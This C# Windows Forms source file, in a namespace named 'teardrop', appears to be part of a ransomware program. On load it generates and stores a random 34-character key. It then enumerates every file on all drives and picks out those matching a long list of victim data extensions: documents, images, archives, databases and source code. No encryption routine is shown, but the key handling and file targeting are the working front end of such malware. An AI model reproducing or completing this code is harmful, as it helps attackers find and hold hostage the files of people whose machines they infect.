using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Management;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace teardrop
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }


        private void Form1_Load(object sender, EventArgs e)
        {            
            if(Properties.Settings.Default.key.Length != 34)
            {
                Properties.Settings.Default.key = Crypto.GetRandomString(34);
                Properties.Settings.Default.Save();
                Properties.Settings.Default.Reload();

                write("Generated key: " + Properties.Settings.Default.key);
            }
            else
            {
                write("Key is: " + Properties.Settings.Default.key);
            }


            Task.Run(() => GetFiles());
        }

        public void write(string text)
        {
            if (textBox1.InvokeRequired)
            {
                textBox1.Invoke(new Action<string>(write), new object[] { text });
                return;
            }
            textBox1.AppendText(text + Environment.NewLine);
        }

        public static List<string> drives = new List<string>();
        public static List<string> files = new List<string>();
        
        public void GetFiles()
        {
            try
            {
                write("Getting Drives...");

                foreach (var drive in DriveInfo.GetDrives())
                {
                    try
                    {
                        write("Found drive " + drive.Name);
                        write("Getting Files of Drive " + drive.Name);
                        files.AddRange(Directory.EnumerateFiles(drive.Name, "*", SearchOption.AllDirectories));
                    }
                    catch (Exception ex1)
                    {

                    }
                }
            }
            catch(Exception ex)
            {

            }


            try
            {
                write("Getting Files");

                foreach (string s in files)
                {
                    string ext = Path.GetExtension(s);
                    var validExtensions = new[]
                    {
                        ".jpg", ".jpeg", ".gif", ".mp3", ".m4a", ".wav", ".pdf", ".exe", ".raw", ".bat", ".json", ".doc", ".txt", ".png", ".cs", ".c", ".java", ".h", ".dll",".rar", ".zip", ".7zip",
                        ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", ".odt", ".csv", ".sql", ".mdb", ".sln", ".php", ".asp", ".aspx", ".html", ".xml", ".psd", ".xhtml", ".odt", ".ods", ".wma",
                        ".wav", ".mpa", ".ogg", ".arj", ".deb", ".pkg", ".rar", ".tar.gz", ".gz", ".zip", ".py", ".pl", ".bin", ".ai" ,".ico",
                        ".asp", ".aspx", ".css", ".js", ".py", ".sh", ".vb", "java", ".cpp"
                    };

                    if (validExtensions.Contains(ext)){
                        write(s);
                    }
                }

                write("Done getting files");
            }
            catch (Exception ex2)
            {
                write(ex2.Message);
            }
        
        }
    }
}
